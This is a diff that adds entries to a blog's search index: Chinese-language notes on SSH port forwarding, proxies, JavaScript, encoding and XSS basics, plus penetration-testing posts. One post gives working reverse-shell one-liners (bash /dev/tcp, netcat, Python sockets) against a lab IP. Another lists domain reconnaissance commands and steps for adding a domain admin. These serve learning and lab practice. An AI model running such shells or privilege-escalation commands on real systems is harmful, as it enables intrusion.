@@ -1,6 +1,265 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[mac下双网卡同时上内网和外网]]></title>
+    <url>%2F2018%2F06%2F02%2Fmac%E4%B8%8B%E5%8F%8C%E7%BD%91%E5%8D%A1%E5%90%8C%E6%97%B6%E4%B8%8A%E5%86%85%E7%BD%91%E5%92%8C%E5%A4%96%E7%BD%91%2F</url>
+    <content type="text"><![CDATA[有的时候我们可能为了访问内网而给电脑插上了网线，但是默认情况下就只能访问内网了，如果我们这个时候想要访问外网的话，就只能把网线拔了，再访问外网了，实在是太麻烦了，那么今天就介绍一个mac下同时访问内网和外网的方法给大家！ 首先，插上网线，并且同时连接上能够上外网的WIFI 之后打开网络偏好设置 在左侧有个下拉箭头，选择设置服务顺序 然后通过拖动，将wifi服务弄到有线服务的上面 配置好了后就准备配置路由了，开启终端输入 1sudo route -n add -net [内网ip] -netmask [内网ip的掩码] [网管ip]]]></content>
+      <categories>
+        <category>Mac OS</category>
+      </categories>
+      <tags>
+        <tag>Mac OS</tag>
+        <tag>小贴士</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[正向代理、反向代理、透明代理]]></title>
+    <url>%2F2018%2F05%2F31%2Fo%2F</url>
+    <content type="text"><![CDATA[0x01 正向代理1LHost ---&gt; Proxy ---&gt; RHost 正向代理就是LHost想要访问RHost，就向Proxy发送请求，并指定要访问的对象是RHost，然后Proxy再把请求发给RHost，并将RHost返回的消息在转发给LHost，也就是说LHost对于RHost是透明的 0x02 反向代理1LHost &lt;---&gt; Proxy &lt;---&gt; Firewall &lt;---&gt; Rhost 反向代理恰恰相反，可以理解为RHost对于LHost是透明的。LHost访问的是反向代理Proxy，而一般防火墙之允许反向代理与实际的服务器RHost进行交互，也就是说，LHost永远不知道真正为他服务的服务器是哪个，他只知道访问的是反向代理，对于LHost来说，Proxy就是服务器 0x03 透明代理透明代理比较类似于正向代理，差别在于用户不知道透明代理的存在，它改编发送request报文，并传送真实的ip地址。 0x04 使用场景 正向代理 正向代理的最经典场景就是翻墙啦，比如我们想要访问谷歌，直接访问肯定不行，但是我们购买了一个代理服务器，这个代理服务器可以访问谷歌，而我们可以访问代理服务器，这样就顺利的上谷歌啦。 反向代理 隐藏自身 反向代理可以用来隐藏服务器，对于用户来说，他们访问的是反向代理，然后由反向代理通过防火墙与真正的服务器进行通讯，这样真正的服务器对于用户来说是透明的 - 负载均衡 反向代理还可以用来进行负载均衡，当大量用户进行访问的时候，访问的是反向代理，然后由隐藏在后面的某一个服务器进行真正的数据处理，每一次处理的服务器不一定是哪个，从而实现负载均衡 透明代理 透明代理最常见的就是公司里的使用了。例如某公司限制使用QQ，某员工想使用QQ进行通讯时，会发现无法使用，这里就是透明代理的作用，公司在内网和外网之间插了一个透明代理，它会根据规则抓取数据包，遇到QQ的请求就会屏蔽掉，从而限制员工使用QQ通信]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网穿透</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SSH端口转发]]></title>
+    <url>%2F2018%2F05%2F31%2FSSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
+    <content type="text"><![CDATA[0x01 SSH隧道什么是SSH隧道呢？举个例子，我们都知道，SSH传输数据是加密传输的，可以有效的保证数据的安全，但是telnet是明文传输的，很不安全，尤其是在公网上，一旦监听到就会有很大的危害，所以一般公司的防火墙都会禁止外网通过telnet连接内网的计算机的。那么如果我们想在外面访问公司的计算机怎么办呢？这个时候就可以用到SSH隧道技术，可以保证数据的传输是加密的。通常我们讲的ssh隧道技术其实就是ssh端口转发。 0x02 SSH本地端口转发原理如下图 建立本机独享隧道 将本地9999端口通过192.168.10.1映射到192.168.10.212345ssh -L 9999:192.168.10.2:23 -Nf 192.168.10.1-L 本地端口转发-N 不执行命令或者脚本，否则会等待用户的输入-f 后台执行 建立共享隧道 他人可以通过访问我的9999端口来访问192.168.10.21ssh -g -L 9999:192.168.10.2:23 -Nf 192.168.10.1 0x03 SSH远程端口转发那么当防火墙设置为我们从外面不能直接访问内部网络的服务器，但是内部网络的服务器可以访问外面的时候，就要用到远程端口转发技术了。此时就要在内网跳板计算机上运行命令1ssh -R 9999:192.168.10.2:23 -Nf &lt;外部ip&gt; 这样外部用户只要在自己的机器上使用1telnet 127.0.0.1:9999 就可以访问到内网192.168.10.2的telnet了。 x04 SSH动态端口转发举个场景，存在远程外网服务器233.233.233.233上3000端口运行这一个web1服务，4000端口运行这一个web2服务，5000端口运行这一个web3服务（随便举的例子），然后由于防火墙策略只能用22端口连接外部网络，那么如何才能访问到那个外网服务器上的web服务呢？有的同学一定会说可以使用ssh本地端口转发呀，是的，我们可以在本地运行命令123ssh -L 6666:localhost:3000 root@233.233.233.233 //访问web1服务ssh -L 7777:localhost:4000 root@233.233.233.233 //访问web2服务ssh -L 8888:localhost:5000 root@233.233.233.233 //访问web3服务 这样做是可以的，但是吧，不觉得很麻烦嘛，如果有10个服务要访问呢，就要输入10条命令，那么这样就可以使用SSH动态端口转发功能了，只需要一条命令即可实现多端口访问。这里需要用到SOCKS代理，使用命令1ssh -D localhost:2000 root@233.233.233.233 然后在浏览器中找到设置代理的地方，选择SOCKS代理，选择SOCKS5，SOCKS主机填localhost，端口填2000，这样我们只需要在浏览器中输入localhost:3000或者localhost:4000或者localhost:5000就可以方便又快速的访问三个web服务了。这里的原理就是我们访问本地加端口的请求会被ssh转发到真正的那个地址（这里就是外网服务器），又真正的那个地址来处理这个请求，然后将数据发回来。 0x05 声明这篇文章是我通过查询资料然后根据自己的认知来写的，其中如果有什么我说错的地方希望能评论或者私信我，不胜感激！]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>内网穿透</tag>
+        <tag>端口转发</tag>
+        <tag>SSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[常见的反弹shell]]></title>
+    <url>%2F2018%2F05%2F31%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell%2F</url>
+    <content type="text"><![CDATA[0x01 bash12345受害机命令bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1本机命令nc -lvvvp 1234 首先在受害机（192.168.80.133）中开一个终端，输入1bash -i &gt;&amp; /dev/tcp/192.168.80.134/1234 0&gt;&amp;1 然后再本机（192.168.80.134）中开个终端，界面如下 输入如下命令1nc -lvvvp 1234 可以看到终端的标签已经改变了，尝试输入命令可以发现已经得到了一个shell 0x02 netcat如果目标主机有nc -e选项的话，也可以通过-e进行反弹shell还是以刚才的环境来做实验首先，在本机上输入1nc -lvvp 1234 进行监听然后再受害机输入1nc -e /bin/bash 192.168.80.134 1234 发现在本机的终端已经可以执行shell了 但是万一没有-e选项呢，那么还可以用管道进行反弹shell首先在本机开两个端口监听12nc -lvvvp 1234nc -lvvvp 4321 然后受害机输入1nc 192.168.80.134 1234 | /bin/bash | nc 192.168.80.134 4321 得到shell 0x03 Python12345678910python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 首先在本机输入1nc -lvvvp 1234 在受害机输入1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 即可看到反弹了一个shell]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[信息收集-基本命令]]></title>
+    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[0x01 获取当前组的计算机名 1net view 0x02 查看所有域1net view /domain 0x03 从计算机名获取其ipv4地址1ping -n 1 SERVER08-DC -4 0x04 获取域环境的用户名单(执行命令的机器需要有域用户权限)1net user /domain 0x05 获取域组名称1net group /domain 0x06 获取域管理员1net group &quot;Domain Admin&quot; /domain 0x07 添加普通域用户123net user Test m03123. /add /domain格式为：net user 用户名 密码 /add /domain 0x08 将普通域用户变为域管理员1net group &quot;Domain Admins&quot; Test /add /domain 0x09 获取计算机名、用户名、软件版本、工作站域、登陆域1net config Workstation 0x0A 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; 0x0B 查看域中所有计算机名(但是域控制器不会出现)1net group &quot;Domain computers&quot; 0x0C 跟踪路由1tracert ip]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[信息收集之定位域]]></title>
+    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%AE%9A%E4%BD%8D%E5%9F%9F%2F</url>
+    <content type="text"><![CDATA[0x01 查看域时间 1net time /domain 0x02 查看域服务器1nslookup -type=SRV _ldap._tcp. 其中的address就是域服务器 0x03 查看dns服务器1ipconfig /all 0x04 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; /domain]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[JSONP实现跨域请求]]></title>
+    <url>%2F2018%2F05%2F31%2FJSONP%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%2F</url>
+    <content type="text"><![CDATA[0x01 前言今天复习了一下有关jsonp相关的攻防知识，突然发现自己对于jsonp的理解只是在书本上的那种，对于其具体的实现还是一知半解的，因此写篇文章记录一下jsonp的实现过程，会附上具体代码滴～ 0x02 JSONP的概念那么什么是JSONP呢，在理解JSONP之前，我们需要知道的是什么是JSON，有过一些web基础的小伙伴一定都听说过这个单词了，JSON是如今用来传输文本的一种很流行的格式，其格式类似这样：1234&#123; &quot;id&quot; : &quot;1&quot;, &quot;name&quot; : &quot;pino&quot;&#125; 而JSONP的话，用一张图片就比较形象的解释了 就是这样喽，多出来了一个单词和一对括号。那么JSONP用来做什么呢？通常来说，是用来跨域的，我们都知道，浏览器是存在一个叫做同源策略的东东，不同源的两个站点理论上是无法进行网络通信的，但是有的时候我们还是需要进行不同源的站点通信，那么就用到了JSONP来进行跨域通信啦。 0x03 JSONP跨域通信的实现JSONP的跨域实现有很多种方式，这里我给大家展示的是两种类型的方式，javascript和jquery，而jquery又有三种方法。 服务端尽管有很多种方式，但是这里服务端的代码是一成不变的，这里我在自己的公网服务器上创建了一个jsonp.php的文件1234567&lt;?php $arr = array(&apos;id&apos;=&gt;1, &apos;name&apos;=&gt;&apos;pino&apos;,&apos;location&apos;=&gt;&apos;china&apos;); $result = json_encode($arr); $callback = $_GET[&apos;callback&apos;]; echo $callback.&quot;($result)&quot;;?&gt; 并且修改自己电脑中的hosts文件，把公网ip对应一个域名，这里我起名为pino.my.com 3.1 前端——Javascript代码 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp&lt;/title&gt; &lt;meta content=&quot;text/html; charset=urf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; function jsonpCallback(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;&lt;/script&gt;&lt;script src=&quot;http://pino.my.com/jsonp.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 需要注意的是，function一定要定义在请求之前，否则会出现未定义的错误 这里我们访问 http://localhost:8080/jsonp.html ，这个网页中有一个跨域请求，请求pino.my.com的资源，通过callback的方式完成请求 成功获取服务端资源！ 前端——JQuery之getJSON方法getJSON方法的用法如下： 实现代码如下：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 访问后同样成功获取资源 前端——JQuery之ajax方法代码12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery ajax&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里的url是直接http://pino.my.com/jsonp.php，没有?callback，这是应为ajax方法的回调是直接放在success选项中了，因此需要在success选项中定义一个回调函数function 访问一下： 前端——JQuery之get方法12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery get&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.get(&quot;http://pino.my.com/jsonp.php?callback=?&quot;, function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, &apos;jsonp&apos; ); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; get方法需要写的东西跟getJSNON很像，但是一定别忘记最后还有一个jsonp的选项，否则会出错的。]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>跨域</tag>
+        <tag>JSONP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Javascript中pop、push、shift、unshift方法的区别]]></title>
+    <url>%2F2018%2F05%2F31%2FJavascript%E4%B8%ADpop%E3%80%81push%E3%80%81shift%E3%80%81unshift%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
+    <content type="text"><![CDATA[0x01 JS中的数组Array在Javascript中，创建一个数组的话一般如下：1var color = new Array(); 当然new关键字也可以省略，而pop、push、shift、unshift四种方法就是用来处理数组的。 0x02 栈方法在Javascript中的数组提供了一种让数组的行为类似于其他数据结构的方法，具体来说就是数组表现的像栈一样。栈是一种LIFO(后进先出)的数据结构。 push()方法可以接受任意数量的参数，把它们逐个添加到数组的末尾，并返回修改后数组的长度。 pop()方法则从数组末尾移除最后一项，减少数组的length值，然后返回移除的项。 具体例子: 0x03 队列方法栈数据结构是后进先出，而队列数据结构则是先进先出 由于push方法是向数组末端添加项的方法，因此要模拟队列只需一个从数组前端取得项的方法。shift方法能够移除数组中的第一个项并返回该项，同时将数组的长度减一。 具体例子： 0x04 模拟逆序队列操作在上一节说到了shift方法，该方法是移除队列的前端的一项，而unshift方法则与其相反，是向队列的前端添加一项，利用unshift和pop方法（从队列的末端拿出一项）可以实现逆序队列的操作]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[字符集]]></title>
+    <url>%2F2018%2F05%2F31%2F%E5%AD%97%E7%AC%A6%E9%9B%86%2F</url>
+    <content type="text"><![CDATA[0x01 字符与字节肉眼看到的一个文字或符号单元就是一个单元（包括乱码），一个字符可能对应1~n字节，1字节为8位，每一位要么是1，要么是0 0x02 字符集一个字符对应1~n字节是由字符集与编码决定的，比如，ASCII字符集就是一个字符对应1字节，不过1字节只用了7位，最高位用于其他目的，所以ASCII字符集共有2的7次方（128）个字符。 0x03 字符集编码一般字符集对应一种编码方式（比如GBK字符集对应了GBK编码），不过Unicode字符集的编码方式有UTF-8、UTF-7、UTF-16、URF-32。编码的目的是最终将这些字符正确的转换为计算机可理解的二进制，对应的解码就是将二进制最终解码为人类可读的字符。 0x04 宽字节编码GB2312、GBK、GB18030、BIG5等就是常说的宽字节，就是只有两字节。宽字节的问题主要是吃ASCII字符（一字节），比如，当字符集为GBK的时候，GBK编码第一字节（高字节）的范围0x81~0xFE，第二字节（低字节）的范围0x40~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5c，正好在GBK的低字节，如果之前有一个高字节，那么正好会被组成一个合法字符 GB2312是被GBK兼容的，它的高位是0xA1~0xF7，低位是0xA1~0xFE，但是在浏览器中处理行为同GBK，可能是浏览器兼容了，把GB2312统一按GBK处理。]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>编码</tag>
+        <tag>字符集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[具备htmlencode功能的标签]]></title>
+    <url>%2F2018%2F05%2F31%2F%E5%85%B7%E5%A4%87htmlencode%E5%8A%9F%E8%83%BD%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
+    <content type="text"><![CDATA[以下标签具有html编码的功能]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>XSS</tag>
+        <tag>HTML标签</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Javascript自解码机制]]></title>
+    <url>%2F2018%2F05%2F31%2FJavascript%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
+    <content type="text"><![CDATA[0x01 Javascript形式的编码 Unicode形式\uH(十六进制) 普通十六进制\xH 纯转义\’、\”、\&lt;、>这样在特殊字符之前加\进行转义 0x02 Javascript自解码机制在javascript执行之前，会进行自解码，将上述形式的编码转换为原始符号 譬如：1&lt;script&gt;document.write(&apos;\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x23\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e&apos;);&lt;/script&gt; 上面编码的代码是&lt;img src=# onerror=alert(‘xss’)&gt;虽然编码了，但是还是会执行alert()]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>编码</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[onmouseover与onmousemove的区别]]></title>
+    <url>%2F2018%2F05%2F31%2Fonmouseover%E4%B8%8Eonmousemove%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
+    <content type="text"><![CDATA[onmouseover事件是指当鼠标指针进入指定区域是触发而onmousemove事件是指当鼠标指针在指定区域移动时触发onmouseover主要是刚进入指定区域的那一瞬间onmousemove是除了刚进入的那一瞬间外，进入后在指定区域移动也算]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>XSS</tag>
+        <tag>HTML标签</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Web前端对象之Browser对象]]></title>
+    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BBrowser%E5%AF%B9%E8%B1%A1%2F</url>
+    <content type="text"><![CDATA[0x01 前言之前对于Web前端不是很擅长，大概是总接触服务端的东西吧，之前有个面试问到了前端方面的知识，才发现自己的前端是有多烂，所以这里记一记笔记吧~ 0x02 Window对象 概念window对象是浏览器打开一个窗口。当HTML文档中包含iframe或frame的时候，浏览器会为HTML文档创建一个window对象，并为每一个iframe再额外创建一个window对象 常用对象属性 document 对Document对象的只读引用 frames 返回窗口中所有命名的frame框架，该属性是一个数组。 history 对History对象的只读引用 location 对Location对象的只读引用 navigator 对Navigator对象的只读引用 opener 返回对创建此窗口的窗口引用 parent 返回父窗口 self 返回当前窗口 top 返回最上层的父窗口 常用对象方法 alert() 弹警告窗 confirm() 弹确认窗 open() / close() 打开/关闭 窗口 print() 打印当前窗口的内容 focus() 给予当前窗口焦点 blur() 把键盘焦点从顶层窗口移开 setTimeout() 在指定的毫秒数后调用函数或计算表达式 setInterval() 按照指定的周期（以毫秒计）来调用函数或计算表达式 execScript() 与eval类似 0x03 Location对象 概念 Location对象包含当前URL的信息，可以用window.location访问 常用对象属性 hostname 返回主机名 pathname 返回路径名 host 返回主机名和端口号 port 返回端口号 protocol 返回协议 hash 返回锚部分（#后面的内容） href 返回完整的url search 返回查询部分（？后面的内容） 常用对象方法 assign() 加载新文档（就是访问一个网页） reload() 重新载入当前文档（刷新） replace() 用新文档替换当前文档 0x04 History对象 概述 History对象包含用户（在浏览器中）访问过的URL 常用对象属性 length返回History列表中URL数量 常用对象方法 back() 加载前一个History列表前一个URL forward() 加载后一个History列表后一个URL go() 直接加载一个History列表中具体的URL 0x05 Navigator对象 概述 Navigator对象包含浏览器的信息 常用对象属性 appCodeName 返回浏览器代码名称 appName 返回浏览器名称 appVersion 返回浏览器平台和版本信息 cookieEnable 返回浏览器是否启用cookie platform 返回运行浏览器的操作系统的版本 userAgent 返回浏览器的UA头]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Web前端对象之Document]]></title>
+    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BDocument%2F</url>
+    <content type="text"><![CDATA[0x01 Document对象当浏览器载入一个HTML文档时，它就变成了document对象。document对象是window对象的属性，可以用window.document来访问 0x02 常用对象属性 document.baseURI 返回网页的绝对URL（IE不支持） document.URL 返回网页的URL document.cookie 返回cookie document.body 返回文档body元素 docuemnt.referrer 返回载入当前文档的文档的 URL document.location 返回当前文档的URL 0x03 常用对象方法 document.write() 向文档中写东西 document.writeln() 跟document.write()一个功能，只不过每次写的时候都会加一个\n document.attachEvent() 事件绑定，仅支持IE浏览器 document.addEventListener() 事件绑定，支持所有浏览器 document.execCommand() 处理HTML数据 document.open() 打开一个输出流，用来收集document.write()和document.writeln()的输出的内容]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[无法执行脚本的标签]]></title>
+    <url>%2F2018%2F05%2F31%2F%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
+    <content type="text"><![CDATA[0x01 无法直接执行脚本 12345678910111213141516- &lt;title&gt;&lt;/title&gt;- &lt;textarea&gt;&lt;/textarea&gt;- &lt;xmp&gt;&lt;/xmp&gt;- &lt;iframe&gt;&lt;/iframe&gt;- &lt;noscript&gt;&lt;/noscript&gt; noscript 元素用来定义在脚本未被执行时的替代内容（文本）。- &lt;noframes&gt;&lt;/noframes&gt; noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部。- &lt;plaintext&gt;&lt;/plaintext&gt; 标签的所有内容，将按照HTML源代码的方式显示 ##0 x02 无法嵌套其他标签 123- &lt;script&gt;&lt;/script&gt;- &lt;style&gt;&lt;/style&gt;]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[HTML自解码机制]]></title>
+    <url>%2F2018%2F05%2F31%2FHTML%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
+    <content type="text"><![CDATA[0x01 HTML形式的编码 进制编码 &#xH;(十六进制格式)、&#D;（十进制形式）、最后的分号（;）可以不要 HTML实体编码 0x02 自解码机制当用户的输入出现在HTML标签内，js执行之前会进行自解码 例如1&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&apos;)&quot; /&gt; 这段代码在执行的过程中，会将html实体编码自解码为之前的符号，因此这段代码会执行alert(1)的弹窗]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[URL编码差异]]></title>
+    <url>%2F2018%2F05%2F31%2FURL%E7%BC%96%E7%A0%81%E5%B7%AE%E5%BC%82%2F</url>
+    <content type="text"><![CDATA[0x01 IE内核编码了双引号和右尖括号 0x02 Chrome编码了单引号、双引号、左右尖括号 0x03 Firefox编码了单引号、双引号、左右尖括号 0x04 相关PHP中，$_SERVER[‘QUERY_STRING’]是获取到浏览器urlencode后的内容而$_GET[‘c’]是获取urlencode之前的内容]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Javascript常用字符串处理函数]]></title>
+    <url>%2F2018%2F05%2F31%2FJavascript%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%2F</url>
+    <content type="text"><![CDATA[0x01 string.charAt()参数index，返回字符串中指定位置的字符；如果超过字符串长度，则返回一个空字符串 0x02 string.charCodeAt()参数index，返回字符串指定位置的字符的unicode值 Unicode 编码单元（code points）的范围从 0 到 1114111。开头的 128 个 Unicode 编码单元和 ASCII 字符编码一样。如果指定的 index 小于 0 或大于字符串的长度，则 charCodeAt 返回 NaN。大于255的为中文 0x03 string.fromCharCode()参数一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。返回指定unicode值的字符 0x04 char.toString()此处参数是数字，返回指定字符的进制数]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Javascript的三套编解码函数]]></title>
+    <url>%2F2018%2F05%2F31%2FJavascript%E7%9A%84%E4%B8%89%E5%A5%97%E7%BC%96%E8%A7%A3%E7%A0%81%E5%87%BD%E6%95%B0%2F</url>
+    <content type="text"><![CDATA[0x01 escape/unescape编码结果 escape不编码的字符有69个1*、+、-、.、/、@、_、0~9、a~z、A~Z escape对0~255以外的unicode值进行编码的时候输出%u**格式 0x02 encodeURI编码结果 encodeURI不编码字符有82个1!、#、$、&amp;、&apos;、(、)、*、+、-、,、.、/、@、_、~、:、;、=、?、0~9、a~z、A~Z 0x03 encodeURIComponent编码结果 encodeURIComponent不编码字符有71个1!、&apos;、(、)、*、-、.、_、~、0~9、a~z、A~Z]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[同源策略]]></title>
+    <url>%2F2018%2F05%2F31%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
